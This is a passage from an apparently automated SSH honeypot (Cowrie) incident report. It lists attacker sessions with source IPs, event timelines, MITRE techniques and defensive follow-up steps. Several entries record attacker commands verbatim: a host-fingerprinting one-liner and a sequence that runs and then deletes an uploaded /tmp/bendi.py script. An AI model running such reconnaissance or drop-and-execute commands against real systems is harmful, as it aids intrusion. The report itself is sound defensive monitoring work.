| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:43:09` | `cowrie.session.connect` |
| `2026-08-25 06:43:09` | `cowrie.client.version` |
| `2026-08-25 06:43:09` | `cowrie.client.kex` |
| `2026-08-25 06:43:10` | `cowrie.login.success` |
| `2026-08-25 06:43:10` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:43:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:43:11` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c21845d40f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:43 |
| **Last Seen** | 2026-08-25 06:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:43:20` | `cowrie.session.connect` |
| `2026-08-25 06:43:20` | `cowrie.client.version` |
| `2026-08-25 06:43:20` | `cowrie.client.kex` |
| `2026-08-25 06:43:22` | `cowrie.login.success` |
| `2026-08-25 06:43:25` | `cowrie.session.params` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.success` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:25` | `cowrie.command.input` |
| `2026-08-25 06:43:26` | `cowrie.log.closed` |
| `2026-08-25 06:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5e495ec0b2

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-25 06:44 |
| **Last Seen** | 2026-08-25 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:44:48` | `cowrie.session.connect` |
| `2026-08-25 06:44:48` | `cowrie.client.version` |
| `2026-08-25 06:44:48` | `cowrie.client.kex` |
| `2026-08-25 06:44:49` | `cowrie.login.success` |
| `2026-08-25 06:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc81a59a865

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-25 06:44 |
| **Last Seen** | 2026-08-25 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:44:49` | `cowrie.session.connect` |
| `2026-08-25 06:44:49` | `cowrie.client.version` |
| `2026-08-25 06:44:49` | `cowrie.client.kex` |
| `2026-08-25 06:44:50` | `cowrie.login.success` |
| `2026-08-25 06:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d97236d64e

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-25 06:44 |
| **Last Seen** | 2026-08-25 06:47 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:44:58` | `cowrie.session.connect` |
| `2026-08-25 06:44:58` | `cowrie.client.version` |
| `2026-08-25 06:44:59` | `cowrie.client.kex` |
| `2026-08-25 06:44:59` | `cowrie.login.success` |
| `2026-08-25 06:45:01` | `cowrie.session.file_upload` |
| `2026-08-25 06:45:02` | `cowrie.session.params` |
| `2026-08-25 06:45:02` | `cowrie.command.input` |
| `2026-08-25 06:45:02` | `cowrie.command.input` |
| `2026-08-25 06:45:02` | `cowrie.command.input` |
| `2026-08-25 06:45:02` | `cowrie.command.failed` |
| `2026-08-25 06:45:03` | `cowrie.log.closed` |
| `2026-08-25 06:45:04` | `cowrie.session.params` |
| `2026-08-25 06:45:04` | `cowrie.command.input` |
| `2026-08-25 06:45:04` | `cowrie.log.closed` |
| `2026-08-25 06:45:05` | `cowrie.session.params` |
| `2026-08-25 06:45:05` | `cowrie.command.input` |
| `2026-08-25 06:45:05` | `cowrie.log.closed` |
| `2026-08-25 06:45:06` | `cowrie.session.params` |
| `2026-08-25 06:45:06` | `cowrie.command.input` |
| `2026-08-25 06:45:06` | `cowrie.command.failed` |
| `2026-08-25 06:45:06` | `cowrie.command.failed` |
| `2026-08-25 06:46:08` | `cowrie.session.params` |
| `2026-08-25 06:46:08` | `cowrie.command.input` |
| `2026-08-25 06:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7b7d412e2d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:45 |
| **Last Seen** | 2026-08-25 06:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:45:33` | `cowrie.session.connect` |
| `2026-08-25 06:45:33` | `cowrie.client.version` |
| `2026-08-25 06:45:33` | `cowrie.client.kex` |
| `2026-08-25 06:45:35` | `cowrie.login.success` |
| `2026-08-25 06:45:36` | `cowrie.session.params` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.success` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.command.input` |
| `2026-08-25 06:45:36` | `cowrie.log.closed` |
| `2026-08-25 06:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65c5dc28ac7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:46 |
| **Last Seen** | 2026-08-25 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:46:39` | `cowrie.session.connect` |
| `2026-08-25 06:46:39` | `cowrie.client.version` |
| `2026-08-25 06:46:39` | `cowrie.client.kex` |
| `2026-08-25 06:46:41` | `cowrie.login.success` |
| `2026-08-25 06:46:42` | `cowrie.session.params` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.success` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:42` | `cowrie.command.input` |
| `2026-08-25 06:46:43` | `cowrie.log.closed` |
| `2026-08-25 06:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8047ab82e774

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-25 06:47 |
| **Last Seen** | 2026-08-25 06:49 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:47:09` | `cowrie.session.connect` |
| `2026-08-25 06:47:09` | `cowrie.client.version` |
| `2026-08-25 06:47:09` | `cowrie.client.kex` |
| `2026-08-25 06:47:10` | `cowrie.login.success` |
| `2026-08-25 06:47:13` | `cowrie.session.file_upload` |
| `2026-08-25 06:47:14` | `cowrie.session.params` |
| `2026-08-25 06:47:14` | `cowrie.command.input` |
| `2026-08-25 06:47:14` | `cowrie.command.input` |
| `2026-08-25 06:47:14` | `cowrie.command.input` |
| `2026-08-25 06:47:14` | `cowrie.command.failed` |
| `2026-08-25 06:47:14` | `cowrie.log.closed` |
| `2026-08-25 06:47:15` | `cowrie.session.params` |
| `2026-08-25 06:47:15` | `cowrie.command.input` |
| `2026-08-25 06:47:15` | `cowrie.log.closed` |
| `2026-08-25 06:47:16` | `cowrie.session.params` |
| `2026-08-25 06:47:16` | `cowrie.command.input` |
| `2026-08-25 06:47:16` | `cowrie.log.closed` |
| `2026-08-25 06:47:17` | `cowrie.session.params` |
| `2026-08-25 06:47:17` | `cowrie.command.input` |
| `2026-08-25 06:47:17` | `cowrie.command.failed` |
| `2026-08-25 06:47:17` | `cowrie.command.failed` |
| `2026-08-25 06:48:19` | `cowrie.session.params` |
| `2026-08-25 06:48:19` | `cowrie.command.input` |
| `2026-08-25 06:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f1bcbdc31ea

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:47 |
| **Last Seen** | 2026-08-25 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:47:43` | `cowrie.session.connect` |
| `2026-08-25 06:47:44` | `cowrie.client.version` |
| `2026-08-25 06:47:44` | `cowrie.client.kex` |
| `2026-08-25 06:47:45` | `cowrie.login.success` |
| `2026-08-25 06:47:47` | `cowrie.session.params` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.success` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.command.input` |
| `2026-08-25 06:47:47` | `cowrie.log.closed` |
| `2026-08-25 06:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-482fbded5251

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:48 |
| **Last Seen** | 2026-08-25 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:48:48` | `cowrie.session.connect` |
| `2026-08-25 06:48:48` | `cowrie.client.version` |
| `2026-08-25 06:48:48` | `cowrie.client.kex` |
| `2026-08-25 06:48:50` | `cowrie.login.success` |
| `2026-08-25 06:48:51` | `cowrie.session.params` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.success` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:51` | `cowrie.command.input` |
| `2026-08-25 06:48:52` | `cowrie.log.closed` |
| `2026-08-25 06:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-043c81d33f9f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:49 |
| **Last Seen** | 2026-08-25 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:49:53` | `cowrie.session.connect` |
| `2026-08-25 06:49:53` | `cowrie.client.version` |
| `2026-08-25 06:49:53` | `cowrie.client.kex` |
| `2026-08-25 06:49:54` | `cowrie.login.success` |
| `2026-08-25 06:49:56` | `cowrie.session.params` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.success` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.command.input` |
| `2026-08-25 06:49:56` | `cowrie.log.closed` |
| `2026-08-25 06:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03dec3b94f08

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:50 |
| **Last Seen** | 2026-08-25 06:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:50:59` | `cowrie.session.connect` |
| `2026-08-25 06:51:00` | `cowrie.client.version` |
| `2026-08-25 06:51:00` | `cowrie.client.kex` |
| `2026-08-25 06:51:01` | `cowrie.login.success` |
| `2026-08-25 06:51:02` | `cowrie.session.params` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.success` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:02` | `cowrie.command.input` |
| `2026-08-25 06:51:03` | `cowrie.log.closed` |
| `2026-08-25 06:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0265d71b210b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:52 |
| **Last Seen** | 2026-08-25 06:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:52:07` | `cowrie.session.connect` |
| `2026-08-25 06:52:07` | `cowrie.client.version` |
| `2026-08-25 06:52:07` | `cowrie.client.kex` |
| `2026-08-25 06:52:09` | `cowrie.login.success` |
| `2026-08-25 06:52:10` | `cowrie.session.params` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.success` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.command.input` |
| `2026-08-25 06:52:10` | `cowrie.log.closed` |
| `2026-08-25 06:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e94e5ff7dc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:52 |
| **Last Seen** | 2026-08-25 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:52:38` | `cowrie.session.connect` |
| `2026-08-25 06:52:38` | `cowrie.client.version` |
| `2026-08-25 06:52:38` | `cowrie.client.kex` |
| `2026-08-25 06:52:39` | `cowrie.login.success` |
| `2026-08-25 06:52:39` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:52:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:52:39` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3471129097ea

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:52 |
| **Last Seen** | 2026-08-25 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:52:42` | `cowrie.session.connect` |
| `2026-08-25 06:52:42` | `cowrie.client.version` |
| `2026-08-25 06:52:42` | `cowrie.client.kex` |
| `2026-08-25 06:52:43` | `cowrie.login.success` |
| `2026-08-25 06:52:43` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:52:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:52:43` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122669a831c6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
